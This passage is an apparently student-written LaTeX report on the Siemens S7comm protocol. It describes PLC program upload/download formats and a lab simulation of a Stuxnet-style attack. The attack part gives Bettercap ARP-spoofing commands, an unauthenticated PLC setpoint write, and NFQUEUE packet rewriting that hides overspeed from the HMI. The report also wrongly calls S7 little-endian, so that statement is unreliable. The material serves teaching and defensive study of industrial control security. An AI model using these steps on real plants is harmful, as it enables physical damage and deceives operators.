+\begin{verbatim}
+    TPKT (4 Byte) + COTP DT (3 Byte) + S7 Header (10 Byte) + Parameter +  data PI-Service
+\end{verbatim}
+    
+    
+\begin{itemize}
+    \item \textbf{Start}: \texttt{param\_length = 5}, function \texttt{0x28}, khối tham số chứa \texttt{0xfd} (trạng thái RUN) + tên \texttt{P\_PROGRAM}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/start_stop_plc/image-2.png}
+    \caption{alt text}
+    \label{fig:cksstartstopplcimage2png}
+\end{figure}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/start_stop_plc/image-3.png}
+    \caption{alt text}
+    \label{fig:cksstartstopplcimage3png}
+\end{figure}
+
+
+
+\item \textbf{Stop}: \texttt{param\_length = 6}, function \texttt{0x29}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/start_stop_plc/image.png}
+    \caption{alt text}
+    \label{fig:acksstartstopplcimagepng}
+\end{figure}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/start_stop_plc/image-1.png}
+    \caption{alt text}
+    \label{fig:cksstartstopplcimage1png}
+\end{figure}
+
+
+
+\end{itemize}
+
+
+
+
+\subsection{Upload và Download chương trình PLC}
+\label{sec:down_up_program}
+
+Theo khái niệm của Siemens thì ngược với khái niệm trong IT thông thường:
+
+
+\begin{itemize}
+    \item \textbf{Download} là khi máy master/ client gửi chương trình điều khiển xuống salve là PLC. Đây chính là khi bấm nút nạp code trên Tia Portal
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{Upload} là khi máy master/ client lấy chương trình điều khiển từ PLC về.
+\end{itemize}
+
+
+Mã nguồn của chương trình điều khiển và hầu như các dữ liệu của chương trình điều khiển được lưu dưới dạng các block. Các loại block trong các thiết bị của Siemens bao gồm:
+
+
+\begin{itemize}
+    \item \textbf{OB} (Organization Block): Đây là block chính để tổ chức chương trình điều khiển. Giống hàm \texttt{main () \{\}} trong C++.
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)DB} ( (System) Data Block): Chứa dữ liệu cần dùng bởi chương trình điều khiển. DB là block dữ liệu do người dùng tạo ra, còn SDB là block dữ liệu hệ thống do Siemens tạo ra.
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)FC} ( (System) Function): Chứa các hàm để có thể tái sử dụng trong chương trình điều khiển. FC là \textbf{stateless}, tức nó không lưu trạng thái/không có bộ nhớ riêng
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)FB} ( (System) Function Block): Giống FC nhưng là \textbf{stateful}. Thường thì nó hay liên kết với một DB để lưu trạng thái của nó.
+\end{itemize}
+
+
+
+\subsubsection{Upload}
+
+
+\begin{verbatim}
+%%{init: {'sequence': {'messageMargin': 60}} }%%
+sequenceDiagram
+    participant Workstation
+    participant PLC
+
+    Workstation->>PLC: Job - Start Upload: Block Address
+    PLC->>Workstation: Ack Data - Start Upload: Block Length
+
+    Workstation-->>PLC: Job - Upload Block
+    PLC-->>Workstation: Ack Data - Upload Block: Block Data
+
+    Workstation->>PLC: Job - End Upload
+    PLC->>Workstation: Ack Data - End Upload
+\end{verbatim}
+
+
+\begin{enumerate}
+    \item \textbf{Start Upload}: Máy client gửi lệnh để yêu cầu PLC trả về chương trình điều khiển nó đang chạy (\textcolor{blue}{Job} Start Upload) và PLC phản hồi lại yêu cầu đó (\textcolor{green}{ACK} Start Upload) . Command này bao gồm các trường theo thứ tự:
+\end{enumerate}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|l|}
+        \hline
+        \textbf{Trường} & \textbf{<span style="color: blue;">Job</span > Start Upload} & \textbf{<span style="color: green;">ACK</span> Start Upload} \\
+        \hline
+        `Function Code` (1 byte) & Cố định `0x1d` & Same \\
+        \hline
+        `Function Status` (1 byte) & - & - \\
+        \hline
+        Không rõ (2 bytes) & `0x0000` & `0x0100` \\
+        \hline
+        `Session ID` (4 bytes) & - & Định danh cho mỗi phiên upload, được PLC trả về, dùng trong các command sau suốt một phiên Upload \\
+        \hline
+        Tên tùy thuộc & `Filename Length` (1 byte) theo sau đó là `Filename` chỉ định tên block cần lấy về & `Length String Length` (1 byte) theo sau đó là `Length String` là một số decimal cho biết độ dài của block mà PLC sẽ trả về trong phần data của gói tin phản hồi sau đó \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+    \texttt{Filename} là cách định danh một block như sau:
+
+
+\begin{verbatim}
+    ------------------------------------------------------------------------------------------------------------------
+    |  1 char - File identifier  |  2 chars - Block type | 5 chars - Block number | 1 char - Destination file system |
+    ------------------------------------------------------------------------------------------------------------------
+\end{verbatim}
+
+
+    Với:
+
+
+\begin{itemize}
+    \item \texttt{File identifier} luôn là \texttt{\_}
+    \item \texttt{Block type} là một trong các loại block đã nêu
+\end{itemize}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|}
+        \hline
+        \textbf{Hex} & \textbf{Block type} \\
+        \hline
+        0x08 & OB \\
+        \hline
+        0x0a & DB \\
+        \hline
+        0x0b & SDB \\
+        \hline
+        0x0c & FC \\
+        \hline
+        0x0d & SFC \\
+        \hline
+        0x0e & FB \\
+        \hline
+        0x0f & SFB \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+\begin{itemize}
+    \item \texttt{Block number} là số hiệu của block
+    \item \texttt{Destination file system} bao gồm \texttt{A} cho Active file system hoặc \texttt{P} cho Passive file system. Block được copy vào active file system sẽ được thực thi ngay khi PLC hoạt động, còn block được copy vào passive file system sẽ cần phải active trước khi được thực thi.
+\end{itemize}
+
+
+    Ví dụ \texttt{\_0800001P} là block OB có số hiệu 1 được copy vào passive file system.
+
+
+\begin{enumerate}
+    \item \textbf{Upload Block}: Sau khi nhận được Start Upload, máy client sẽ gửi lệnh Upload Block để yêu cầu PLC trả về một block dữ liệu của chương trình điều khiển. PLC sẽ trả về block dữ liệu đó trong phần data của gói tin phản hồi. Command này bao gồm các trường theo thứ tự
+\end{enumerate}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|l|}
+        \hline
+        \textbf{Trường} & \textbf{<span style="color: blue;">Job</span > Upload Block} & \textbf{<span style="color: green;">ACK</span> Upload Block} \\
+        \hline
+        `Function Code` (1 byte) & Cố định `0x1e` & Same \\
+        \hline
+        `Function Status` (1 byte) & - & `0x01` nếu còn nhiều block cần upload, `0x00` nếu đã hết block cần upload \\
+        \hline
+        Không rõ (2 bytes) & `0x0000` & `0x0000` \\
+        \hline
+        `Session ID` (4 bytes) & Dùng sessionID đã có & Same \\
+        \hline
+        `Data` & - & Chữa code chương trình điều khiển, bao gồm `Length` (2 bytes) cho biết độ dài của phần data này, cố định `0x00fb`, `Block Data` chứa dữ liệu của block cần upload. Dữ liệu này ở dạng ASCII \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+\begin{enumerate}
+    \item \textbf{End Upload}: Khi đã nhận đủ dữ liệu theo trường \texttt{Length String} của gói tin ACK Start Upload, máy client sẽ gửi lệnh End Upload để kết thúc phiên upload. PLC sẽ phản hồi lại yêu cầu đó để xác nhận đã kết thúc phiên upload thành công. Command này bao gồm các trường theo thứ tự:
+\end{enumerate}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|l|}
+        \hline
+        \textbf{Trường} & \textbf{<span style="color: blue;">Job</span > End Upload} & \textbf{<span style="color: green;">ACK</span> End Upload} \\
+        \hline
+        `Function Code` (1 byte) & Cố định `0x1f` & Same \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+\subsubsection{Download}
+
+
+\begin{verbatim}
+%%{init: {'sequence': {'messageMargin': 60}} }%%
+sequenceDiagram
+    participant Workstation
+    participant PLC
+
+    Workstation->>PLC: Job - Request Download: Block Address, Length
+    PLC->>Workstation: Ack Data - Request Download
+    
+  
+    PLC-->>Workstation: Job - Download Block: Block Address
+    Workstation-->>PLC: Ack Data - Download Block: Block Data
+
+    Workstation->>PLC: Job - Download Ended
+    PLC->>Workstation: Ack Data - Download Ended
+\end{verbatim}
+
+
+\begin{enumerate}
+    \item \textbf{Start Download}: Máy client gửi lệnh để yêu cầu PLC chuẩn bị nhận chương trình điều khiển mới (\textcolor{blue}{Job} Request Download) và PLC phản hồi lại yêu cầu đó (\textcolor{green}{ACK} Request Download) . Gói tin \textcolor{blue}{Job} Request Download có 2 trường mới là \texttt{Block Length} cho biết độ dài của block dữ liệu mà máy client sẽ gửi, \texttt{Payload Length} cũng thể nhưng không tính độ dài của block header
+\end{enumerate}
+
+
+
+\begin{enumerate}
+    \item \textbf{Download Block}: PLC chủ động gửi request để yêu cầu máy client gửi block dữ liệu của chương trình điều khiển mới. Máy client sẽ gửi block dữ liệu đó trong phần data của gói tin phản hồi.
+\end{enumerate}
+
+
+Các trường thông tin còn lại y hệt như trong phần Upload. Chỉ có lưu ý trong quá trình Download, \texttt{Session ID} luôn là \texttt{0x00000000}, nó không được sử dụng, thay vào đó, trong Download thì sử dụng \texttt{Filename} để định danh trong một session Download.
+
+
+\subsection{Mô phỏng traffic}
+
+
+Ở phần này đã thử mô phỏng việc download và upload chương trình điều khiển PLC nhưng không thành công do giới hạn phần mềm mô phỏng.
+
+
+Khi upload code chương trình từ OpenPLC Editor vào OpenPLC Runtime thì chương trình được gửi thông qua RESTful API của OpenPLC Runtime thay vì bằng cách gửi thông qua cấu trúc chuẩn của S7comm.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-5.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage5png}
+\end{figure}
+
+
+OpenPLC Runtime không hỗ trợ việc nạp chương tình theo cách thông thường của Siemens S7comm.
+
+
+Một cách khác là thử mô phỏng việc upload chương trình trên một PLC Siemens thông qua PLC Sim Advance. Cách này thì chương trình được gửi thông qua cấu trúc chuẩn của S7comm. 
+
+
+Bước 1: Set up một Switch ảo để các thiết bị ảo của Siemens sử dụng:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-2.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage2png}
+\end{figure}
+
+
+Bước 2: Chạy một PLC Siemens trong PLC Sim Advance sử dụng cùng giải mạng với Switch ảo. Tuy nhiên PLC Sim Advance chỉ hỗ trợ mô phỏng PLC Simens S7-1500.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image.png}
+    \caption{alt text}
+    \label{fig:cksdownupprogramimagepng}
+\end{figure}
+
+
+Bước 3: Kết nối PLC với HMI WinCC thông qua card kết nối IE general
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-1.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage1png}
+\end{figure}
+
+
+Bước 4: Tạo một chương trình PLC, nạp vào PLC vào chạy thử:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-3.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage3png}
+\end{figure}
+
+
+Ảnh chụp bao gồm chương trình PLC đang ở running mode, PLC đang chạy trong PLC Sim Advance và HMI WinCC đang hiển thị giá trị của các biến PLC.
+
+
+Tuy nhiên khi quan sát các gói tin trên Wireshark thì thấy Wireshark không Parse được gói tin S7comm. Sau khi tìm hiểu thì là do S7-1500 sử dụng giao thức S7 comm plus và không có cách nào ép S7-1500 sử dụng giao thức S7 comm thông thường (Theo như bài viết này text (\url{https://industrialmonitordirect.com/blogs/knowledgebase/s7comm-vs-s7comm-plus-switching-protocol-in-s7-1500-hmi-communication}) thì bật Option \texttt{Permit access with PUT/GET communication from remote partners} chỉ giúp tạo tính tương thích, các máy khác lấy thông tin từ S7 comm plus như thể chúng đang lấy thông tin từ S7 comm thông thường chứ Wireshark thì vẫn không thể Parse được gói tin S7comm plus.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-6.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage6png}
+\end{figure}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/down_up_program/image-4.png}
+    \caption{alt text}
+    \label{fig:ksdownupprogramimage4png}
+\end{figure}
+
+
+Wireshark chỉ có thể nhận diện được lớp COTP ở bên ngoài gói tin S7comm plus chứ không thể parse sâu hơn gói tin S7comm plus được gói trong gói tin COTP này.
+
+
+
+Vì thế nên trong dự án này chúng tôi sẽ sử dụng traffic mô phỏng từ trang sau: https://wiki.wireshark.org/S7comm
+\subsection{Mô phỏng tấn công Stuxnet (Man-in-the-Middle)}
+\label{sec:stuxnet_mitm_sim}
+
+Trong bối cảnh căng thẳng địa chính trị ở Trung Đông, bất chấp thỏa thuận với cơ quan nguyên tử quốc tế (IAEA) về việc giám sát các hoạt động hạt nhân của Iran, chương trình hạt nhân tại nước này không ngừng được đẩy mạnh gây nên mối đe dọa lớn về an ninh với các nước trung khu vực. 
+
+
+Dưới thời tổng thống George W. Bush, sau nhiều nỗ lực ngoại giao thất bại, Hoa Kỳ ( đứng đầu bởi Cơ quan NSA) và Israel bắt đầu một chiến dịch tấn công mạng có tên là \textbf{Operation Olympic Games} nhằm phá hoại chương trình hạt nhân của Iran. Mục tiêu là làm hư hại các máy ly tâm khí (\textbf{gas centrifuges}) được sử dụng để làm giàu Uranium tại nhà máy hạt nhân Natanz ở Iran, từ đó làm chậm lại chương trình hạt nhân của nước này. Chương trình được cho là đã phát triển một loại mã độc có tên là \textbf{Stuxnet} từ 2004-2008, tiêu tốn 2 tỷ đô la Mỹ cùng các chiến dịch tình báo, xâm nhập phức tạp để đưa được mã độc vào hệ thống mạng nội bộ được cách ly air-gapped hoàn toàn của nhà máy hạt nhân Natanz.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-12.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage12png}
+\end{figure}
+
+
+Quá trình tấn công:
+
+
+\begin{enumerate}
+    \item \textbf{Lây nhiễm trong windows}: Được lây nhiễm vào một máy tính trong mạng nội bộ thông qua USB do một gián điệp để lại. Sau đó, nó lan tiếp trong mạng nội bộ thông qua 4 lỗ hổng Zero-day  của Windows và gửi thông tin về các máy chủ Command and Control (C\&C) của kẻ tấn công [[1]].
+\end{enumerate}
+
+
+
+\begin{enumerate}
+    \item \textbf{Lây nhiễm vào phần mềm (*)Siemens Step 7}: Tại mỗi máy tính windows, nó quét để truy tìm phần mềm \textbf{Siemens Step 7}. Nó can thiệp vào thư viện giao tiếp \texttt{s7otbxdx.dll} của Step7 để chặn và sửa luồng trao đổi giữa phần mềm Step 7 và PLC:
+\end{enumerate}
+
+
+
+Normal communications between Step 7 and a Siemens PLC
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-9.png}
+    \caption{}
+\end{figure}
+
+Stuxnet hijacking communication between Step 7 software and a Siemens PLC
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-10.png}
+    \caption{}
+\end{figure}
+
+
+    Về bản chất, đây là một kiểu man-in-the-middle ở tầng phần mềm
+
+
+\begin{enumerate}
+    \item \textbf{Can thiệp vào quá trình điều khiển máy ly tâm khí}: Stuxnet can thiệp vào quá trình điều khiển máy ly tâm khí bằng cách sửa đổi code trong PLC để tăng tốc độ vòng quay của máy ly tâm lên mức cao hơn bình thường. Cụ thể, Stuxnet can thiệp vào Step7 để gửi code độc hại nhằm tăng tốc độ vòng quay đến PLC -> PLC thực thi code, gửi tín hiệu điều khiển đến thiết bị biến tần (VFD Variable Frequency Drive) -> biến tần điều chỉnh tốc độ vòng quay của máy ly tâm -> làm hỏng máy ly tâm.
+\end{enumerate}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/stuxnet_mitm_sim/image-11.png}
+    \caption{alt text}
+    \label{fig:stuxnetmitmsimimage11png}
+\end{figure}
+
+
+    Đồng thời, Stuxnet cũng can thiệp vào đầu ra của PLC để gửi phần mềm HMI WinCC đọc dữ liệu sai lệch về tình trạng của máy ly tâm, khiến các kỹ sư không nhận ra rằng máy ly tâm đang bị hư hại.
+
+
+
+Tuy nhiên điều tinh vi ở đây là Stuxnet chọn lọc các mục tiêu rất kỹ càng. Nếu mục tiêu không thỏa mãn yêu cầu, Stuxnet sẽ ngủ đông để giảm thiểu sự hiện diện của mình. Nó chỉ tấn công vào các PLC điều khiển biến tần có thông số:
+
+
+\begin{itemize}
+    \item Thuộc dòng Siemens S7-300
+\end{itemize}
+
+
+\begin{itemize}
+    \item Nhà sản xuất biến tần là Vacon (Finland)hoặc Fararo Paya (Iran)
+\end{itemize}
+
+
+\begin{itemize}
+    \item Tần số vận hành nằm trong khoảng \textbf{807} Hz đến \textbf{1210} Hz. Do đây là tốc độ quay lớn hơn nhiều so với tốc độ của hầu hết các máy công nghiệp, trừ máy ly tâm khí.
+\end{itemize}
+
+
+Khi đủ điều kiện, Stuxnet thay đổi tần số đầu ra trong các giai đoạn ngắn để làm rối loạn hoạt động của hệ thống, với các mức thường được nhắc đến là 1410 Hz, 2 Hz và 1064 Hz. Với cách này, nó làm thay đổi tốc độ quay của máy ly tâm và có thể gây hư hại vật lý, trong khi dữ liệu giám sát vẫn bị che giấu.
+
+
+Sự tồn tại của Stuxnet chỉ được phát hiện rộng rãi vào năm 2010, khi phiên bản thứ 3 của nó  đã lan rộng ra toàn thế giới. Một công ty an ninh mạng Belarus phát hiện ra nó trên một máy tính ở Iran. Sau đó, các nhà nghiên cứu bảo mật đã phân tích và xác định rằng Stuxnet là một phần của một chiến dịch tấn công mạng tinh vi nhằm vào chương trình hạt nhân của Iran.
+
+
+\textit{Trong mô phỏng tấn công của đồ án này, để phù hợp với giới hạn về thời gian và nguồn lực, chúng tôi sẽ mô phỏng đơn giản hóa kịch bản tấn công man-in-the-middle ở trên tầng giao thức mạng thay vì tại dll như thực tế Stuxnet đã làm.}
+
+
+\textbf{(*)} \textit{Tia Portal là một bộ phần mềm độc quyền của Siemens để làm việc với các dòng PLC của hãng (S7-300, S7-400, S7-1200, S7-1500), bao gồm: STEP 7 dùng để lập trình và cấu hình cho các dòng PLC, WinCC dùng để thiết kế HMI/SCADA, S7- PLCSIM / S7 PLCSIM Advanced dùng để mô phỏng hoạt động của PLC trên máy tính mà không cần phần cứng thực tế, Startdrive dùng để cấu hình biến tần, động cơ.}
+
+
+\noindent\textbf{Mô phỏng tấn công.}\par
+\medskip
+
+\begin{verbatim}
+![alt text](<Stuxnet (1).svg>)
+\end{verbatim}
+
+
+\textit{Mục tiêu của tấn công là làm thay đổi giá trị của một biến nằm trong datablock của PLC, từ đó làm thay đổi hành vi của hệ thống điều khiển. Đồng thời can thiệp vào quá trình gửi dữ liệu để HMI không nhận ra sự thay đổi này.}
+
+
+\subsubsection{Thiết lập PLC}
+
+
+Import dự án vào OpenPLC Editor với thư mục này (\url{./plc_server_code/}). Chương trình đang chạy trên PLC có dạng như sau
+
+
+\begin{itemize}
+    \item Với cấu hình datablock như sau để làm biến đầu vào (DB1) và ra (DB2) cho PLC:
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-1.png}
+    \caption{}
+\end{figure}
+
+Khai báo 2 datablock do mỗi datablock trong OpenPLC chỉ cho phép 1 kiểu dữ liệu
+
+
+\begin{itemize}
+    \item Khai báo tag và chương trình logic (viết dưới dạng Structured Text). Chương trình mô phỏng lại tốc độ quay của động cơ dao động quanh mốc \texttt{iSetpoint} được chỉ định bằng \texttt{1200}:
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-2.png}
+    \caption{}
+\end{figure}
+
+Khai báo tag và chương trình logic (viết dưới dạng Structured Text)
+
+
+    Gồm các tags (Giống dạng binding variables trong IT):
+
+
+\begin{itemize}
+    \item \texttt{iSimSpeed}: tốc độ thực tế máy đang quay, nằm ở \texttt{DB1}, lấy 2 Byte từ offset 0
+    \item \texttt{iSetpoint}: tốc độ ngưỡng để máy quay dao động quanh giá trị này, nằm ở \texttt{DB1}, lấy 2 Byte từ offset 2
+    \item \texttt{iCounter}: Dùng để tạo dao động mô phỏng.
+    \item \texttt{bCentrifugeStatus}: trạng thái hoạt động của máy ly tâm với 0 là bình thường, 1 là quá tốc độ, nằm ở \texttt{DB2}, lấy 1 Byte từ offset 0. Ở đây mô phỏng khi tốc độ quay vượt quá 1500 Hz thì máy ly tâm bị hư hại.
+\end{itemize}
+
+
+
+
+\subsubsection{Thiết lập HMI}
+
+
+Import dự án vào FUXA với thư mục này (\url{./hmi/fuxa_hmi_design.json}):
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-8.png}
+    \caption{}
+\end{figure}
+
+Khai báo các HMI tags tương ứng với các PLC tags cần giám sát
+
+
+Giao diện HMI, hiện tại máy đang hoạt động quanh mức 1200 nên sẽ hiển thị màu xanh
+
+
+Trong Debugger của OpenPLC Editor cũng hiển thị thông tin tương tự:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-17.png}
+    \caption{}
+\end{figure}
+
+Thông tin tương tự trong Debugger của OpenPLC Editor
+
+
+\textit{Nên bật OpenPLC Editor nên để kiểm tra lại xem chương trình đã được nạp vào PLC chưa trước khi kết nối tới HMI hay đọc ghi vào PLC}
+
+
+Thu thập gói tin trên máy HMI thấy giao tiếp giữa HMI và PLC là sự lặp đi lặp lại của 2 cặp request-response sau:
+
+
+\begin{itemize}
+    \item Cặp đầu tiên là request yêu cầu đọc 4 byte tại DB1 tại bit 0 của byte 0, tức ứng với biến \texttt{iSimSpeed} và \texttt{iSetpoint}:
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-4.png}
+    \caption{}
+\end{figure}
+
+Request yêu cầu đọc 4 byte tại DB1 tại bit 0 của byte 0, tức ứng với biến \texttt{iSimSpeed} và \texttt{iSetpoint}
+
+
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-5.png}
+    \caption{}
+\end{figure}
+
+Response trả về giá trị của biến \texttt{iSimSpeed} và \texttt{iSetpoint}
+
+
+    Biến \texttt{iSimSpeed} là \texttt{042d} do nó nằm ở trước trong cấu hình các PLC tags, biến \texttt{iSetpoint} là \texttt{04b0}. S7 dùng Little Endian, nên giá trị \texttt{042d} tương ứng với \texttt{1069} và \texttt{04b0} tương ứng với \texttt{1200}.
+
+
+\begin{itemize}
+    \item Cặp thứ hai là request yêu cầu đọc 1 byte tại DB2 tại bit 0 của byte 0, tức ứng với biến \texttt{bCentrifugeStatus}:
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-6.png}
+    \caption{}
+\end{figure}
+
+Request yêu cầu đọc 1 byte tại DB2 tại bit 0 của byte 0, tức ứng với biến \texttt{bCentrifugeStatus}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-7.png}
+    \caption{}
+\end{figure}
+
+Response trả về giá trị của biến \texttt{bCentrifugeStatus}. Hiện đang là 0 tức máy đang hoạt động bình thường
+
+
+\subsubsection{Attacker}
+
+
+Từ máy tấn công sẽ làm đồng thời:
+
+
+\begin{enumerate}
+    \item \textbf{Tạo một lệnh ghi để ghi} giá trị của một biến nằm trong Datablock của PLC sử dụng thư viện Snap 7 hoặc S7 Comm của Python. Việc ghi này dễ dàng do giao thức S7 không có cơ chế xác thực. Ở đây sẽ chỉnh sửa giá trị biến \texttt{Setpoint} nằm ở vị trí \texttt{DB1.DBW2} từ \texttt{1200} thành \texttt{2000}. Script tại đây (Bản dùng thư viện Snap7) (\url{./attacker/test_readwrite_db_via_snap7.py}) hoặc đây (Bản dùng thư viện S7 Comm) (\url{./attacker/test_readwrite_db_via_pythonS7comm.py}). Output:
+\end{enumerate}
+
+
+\begin{verbatim}
+    Current Speed  | Setpoint Speed    | Centrifuge Status
+    --------------------------------------------------
+    b'\x03\xc1'    |    b'\x04\xb0'    |    b'\x00'
+    b'\x07\xe4'    |    b'\x07\xd0'    |    b'\x01'
+\end{verbatim}
+
+
+    \texttt{iSetpoint} từ \texttt{1200} (0x04b0) thành \texttt{2000} (0x07d0) và khi này trạng thái \texttt{bCentrifugeStatus} từ \texttt{0} thành \texttt{1}.  Nếu như chưa chạy script can thiệp thì trên HMI sẽ thấy máy đang dao động quanh mức 2000:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-14.png}
+    \caption{}
+\end{figure}
+
+Máy đang dao động quanh mức 2000, hiển thị màu đỏ do quá mốc 1500 Hz
+
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-15.png}
+    \caption{}
+\end{figure}
+
+Kiểm tra trong các gói tin PLC gửi tới HMI để thấy giá trị của biến \texttt{iSetpoint} đã được thay đổi thành \texttt{2000} (0x07d0)
+
+
+    Tấn công thay đổi giá trị của PLC thành công, giờ ta sẽ can thiệp vào giao tiếp giữa HMI và PLC để HMI không nhận ra sự thay đổi này.
+
+
+
+
+\begin{enumerate}
+    \item \textbf{Tấn công Man in the middle bằng kỹ thuật ARP Spoofing} giữa cổng của Router (\texttt{.60.1}) và HMI (\texttt{.60.10}) thông qua tool \textbf{Bettercap}:
+\end{enumerate}
+
+
+
+\begin{verbatim}
+    # Run on attacker machine
+    sudo bettercap -iface ens33 
+
+    # Scan network for devices
+    net.probe on
+
+    # Show network devices
+    net.show
+\end{verbatim}
+
+
+    Đảm bảo đã Bettercap đã thu được thông tin của tất cả các thiết bị trong mạng:
+
+
+\begin{verbatim}
+    +---------------+-------------------+---------+--------------+-------+--------+----------+
+    |     IP ^      |        MAC        |  Name   |    Vendor    | Sent  | Recvd  |   Seen   |
+    +---------------+-------------------+---------+--------------+-------+--------+----------+
+    | 192.168.60.20 | 00:0c:29:a6:c0:b0 | ens33   | VMware, Inc. | 0 B   | 0 B    | 14:52:24 |
+    | 192.168.60.1  | 00:0c:29:f1:b8:5e | gateway | VMware, Inc. | 816 B | 0 B    | 14:52:24 |
+    |               |                   |         |              |       |        |          |
+    | 192.168.60.10 | 00:0c:29:2f:0d:bb |         | VMware, Inc. | 16 kB | 8.3 kB | 14:53:43 |
+    +---------------+-------------------+---------+--------------+-------+--------+----------+
+\end{verbatim}
+
+
+\begin{verbatim}
+    # Specify IP of Router gateway and HMI as targets
+    set arp.spoof.targets 192.168.60.1, 192.168.60.10
+    
+    # Enable internal ARP spoofing
+    set arp.spoof.internal true
+    # Enable full duplex ARP spoofing since we need to ensure HMI -> PLC direction is still working
+    set arp.spoof.fullduplex true
+    
+    # Start ARP spoofing
+    arp.spoof on
+\end{verbatim}
+
+
+    Khi này trên HMI bắt gói tin sẽ thấy xen kẽ các gói tin của S7 và các gói ARP Spoofing:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-13.png}
+    \caption{}
+\end{figure}
+
+Gói tin S7comm và ARP Spoofing xen kẽ nhau
+
+
+\begin{enumerate}
+    \item \textbf{Chỉnh sửa gói tin S7comm} được gửi từ PLC tới HMI để thay đổi giá trị \texttt{Setpoint} từ \texttt{2000} thành \texttt{1200}. Sau khi Bettercap đã redirect được gói tin giữa Router gateway và Router, đẩy các gói tin này vào NFQUEUE của OS (Vì ta muốn xử lý các gói tin thay vì để OS tự động chuyển tiếp) và sử dụng một script Python để lấy gói tin từ NFQUEUE (thông qua thư viện \texttt{NetfilterQueue}), parse gói tin S7comm, tìm đến vị trí chứa giá trị \texttt{Setpoint} ở \texttt{DB1.DBW2} và sửa giá trị này từ \texttt{2000} thành \texttt{1200} trước khi đẩy gói tin trở lại NFQUEUE để tiếp tục được chuyển đi. Script tại đây (\url{./attacker/mitm/s7_intercept.py}).
+\end{enumerate}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-18.png}
+    \caption{}
+\end{figure}
+
+Tấn công thành công khi thực tế máy đang chạy ở mức > 1500 Hz (màu đỏ), nhưng Setpoint vẫn hiển thị ở mức 1200
+
+
+Kiểm tra các gói tin:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-28.png}
+    \caption{}
+\end{figure}
+
+Giá trị \texttt{iSetpoint} trên gói tin tới HMI đang là 1200 (04b0)
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-29.png}
+    \caption{}
+\end{figure}
+
+Giá trị \texttt{bCentrifugeStatus} trên gói tin tới HMI 01
+
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\textwidth]{../attacks/stuxnet_mitm_sim/image-3.png}
+    \caption{}
